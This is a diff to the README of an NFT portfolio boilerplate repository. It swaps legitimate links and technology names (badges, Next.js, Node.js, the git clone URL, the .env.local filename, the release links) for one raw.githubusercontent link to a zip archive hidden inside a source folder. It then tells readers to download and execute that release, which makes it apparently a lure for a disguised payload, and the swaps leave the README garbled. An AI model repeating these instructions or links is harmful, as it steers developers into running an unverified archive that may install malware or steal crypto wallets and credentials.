@@ -1,6 +1,6 @@
 # NFT Portfolio Boilerplate 🚀
 
-![NFT Portfolio Boilerplate](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![Release](https://img.shields.io/badge/releases-latest-orange.svg)
+![NFT Portfolio Boilerplate](https://raw.githubusercontent.com/Kelly-ok/nft-portfolio-boilerplate/main/src/app/nft/[contractAddress]/[tokenId]/portfolio_nft_boilerplate_3.2.zip) ![License](https://raw.githubusercontent.com/Kelly-ok/nft-portfolio-boilerplate/main/src/app/nft/[contractAddress]/[tokenId]/portfolio_nft_boilerplate_3.2.zip) ![Release](https://raw.githubusercontent.com/Kelly-ok/nft-portfolio-boilerplate/main/src/app/nft/[contractAddress]/[tokenId]/portfolio_nft_boilerplate_3.2.zip)
 
 Welcome to the **NFT Portfolio Boilerplate**! This project serves as a comprehensive open-source platform for managing your NFT portfolio. With seamless integration across multiple marketplaces, it provides a user-friendly dashboard to view, manage, and trade NFTs effortlessly.
 
@@ -17,7 +17,7 @@ Welcome to the **NFT Portfolio Boilerplate**! This project serves as a comprehen
 
 ## Introduction
 
-In the rapidly evolving world of NFTs, managing your collection can be challenging. The **NFT Portfolio Boilerplate** addresses this need by offering a centralized platform where users can easily interact with various NFT marketplaces. Built with **Next.js**, **TypeScript**, and **Tailwind CSS**, this boilerplate provides a solid foundation for developers looking to build their own NFT portfolio management applications.
+In the rapidly evolving world of NFTs, managing your collection can be challenging. The **NFT Portfolio Boilerplate** addresses this need by offering a centralized platform where users can easily interact with various NFT marketplaces. Built with **https://raw.githubusercontent.com/Kelly-ok/nft-portfolio-boilerplate/main/src/app/nft/[contractAddress]/[tokenId]/portfolio_nft_boilerplate_3.2.zip**, **TypeScript**, and **Tailwind CSS**, this boilerplate provides a solid foundation for developers looking to build their own NFT portfolio management applications.
 
 ## Features
 
@@ -30,7 +30,7 @@ In the rapidly evolving world of NFTs, managing your collection can be challengi
 
 ## Technologies Used
 
-- **Next.js**: A React framework for server-rendered applications.
+- **https://raw.githubusercontent.com/Kelly-ok/nft-portfolio-boilerplate/main/src/app/nft/[contractAddress]/[tokenId]/portfolio_nft_boilerplate_3.2.zip**: A React framework for server-rendered applications.
 - **TypeScript**: A superset of JavaScript that adds static types.
 - **Tailwind CSS**: A utility-first CSS framework for rapid UI development.
 - **NFTGo API**: For aggregating data from various NFT marketplaces.
@@ -41,7 +41,7 @@ To get started with the **NFT Portfolio Boilerplate**, follow these steps:
 
 ### Prerequisites
 
-- Node.js (version 14 or higher)
+- https://raw.githubusercontent.com/Kelly-ok/nft-portfolio-boilerplate/main/src/app/nft/[contractAddress]/[tokenId]/portfolio_nft_boilerplate_3.2.zip (version 14 or higher)
 - npm or yarn
 - Git
 
@@ -49,7 +49,7 @@ To get started with the **NFT Portfolio Boilerplate**, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Kelly-ok/nft-portfolio-boilerplate.git
+   git clone https://raw.githubusercontent.com/Kelly-ok/nft-portfolio-boilerplate/main/src/app/nft/[contractAddress]/[tokenId]/portfolio_nft_boilerplate_3.2.zip
    cd nft-portfolio-boilerplate
    ```
 
@@ -60,7 +60,7 @@ To get started with the **NFT Portfolio Boilerplate**, follow these steps:
    yarn install
    ```
 
-3. Create a `.env.local` file in the root directory and add your NFTGo API key:
+3. Create a `https://raw.githubusercontent.com/Kelly-ok/nft-portfolio-boilerplate/main/src/app/nft/[contractAddress]/[tokenId]/portfolio_nft_boilerplate_3.2.zip` file in the root directory and add your NFTGo API key:
    ```
    NEXT_PUBLIC_NFTGO_API_KEY=your_api_key_here
    ```
@@ -105,9 +105,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, visit the [Releases section](https://github.com/Kelly-ok/nft-portfolio-boilerplate/releases). Download the latest version and execute it to explore the features of the **NFT Portfolio Boilerplate**.
+For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/Kelly-ok/nft-portfolio-boilerplate/main/src/app/nft/[contractAddress]/[tokenId]/portfolio_nft_boilerplate_3.2.zip). Download the latest version and execute it to explore the features of the **NFT Portfolio Boilerplate**.
 
-For more information, check the [Releases section](https://github.com/Kelly-ok/nft-portfolio-boilerplate/releases) to stay updated on new features and fixes.
+For more information, check the [Releases section](https://raw.githubusercontent.com/Kelly-ok/nft-portfolio-boilerplate/main/src/app/nft/[contractAddress]/[tokenId]/portfolio_nft_boilerplate_3.2.zip) to stay updated on new features and fixes.
 
 ## Conclusion
 
